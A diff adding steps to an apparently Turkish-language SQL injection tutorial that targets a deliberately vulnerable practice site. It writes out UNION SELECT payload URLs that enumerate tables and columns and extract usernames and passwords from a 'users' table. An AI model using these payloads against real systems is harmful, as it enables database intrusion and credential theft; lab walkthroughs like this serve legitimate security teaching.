@@ -131,3 +131,20 @@ Bu sayede olmayan bir ilan geldi ve 7, 2, 9, 11 sayıları geldi bu sayılar bu 
 http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 FROM information_schema.tables WHERE table_name = 'users'
 ```
 ![Tablolar](/resimler/tablolar.png)
+
+Böylelikle sistemde bulunan tablo adlarını çekmiş olduk.
+
+5) Tablo ismini çektikten sonra son önemli noktamız kolon isimlerini çekmektir. Bunun içinde tablo isminin users olan kolonları listeliyorum
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name = 'users'
+```
+![kolonlar](/resimler/columns.png)
+
+6) Artık tablo isimini ve kolonları bildiğimize göre istediğimiz veriyi rahatça çekebiliriz.
+```
+http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,concat(uname,":",pass),8,9,10,11 FROM users
+```
+![Veriler](/resimler/uname_pass.png)
+
+Sonuç olarak kullanıcı_adı = test, şifresi = test.
